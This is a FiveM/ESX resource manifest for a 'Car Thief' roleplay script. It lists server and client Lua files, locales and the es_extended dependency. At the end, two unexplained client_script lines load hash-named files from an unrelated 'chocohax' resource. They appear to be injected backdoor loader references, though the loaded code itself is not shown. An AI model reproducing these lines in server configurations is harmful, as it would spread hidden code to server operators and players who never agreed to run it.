resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'ESX Car Thief'

version '1.0.0'

server_scripts {
    '@es_extended/locale.lua',
	'config.lua',
	'server/main.lua',
	'locales/en.lua',
	'locales/es.lua',
	'locales/fr.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'config.lua',
	'client/main.lua',
	'locales/en.lua',
	'locales/es.lua',
	'locales/fr.lua'
}

dependency 'es_extended'

client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'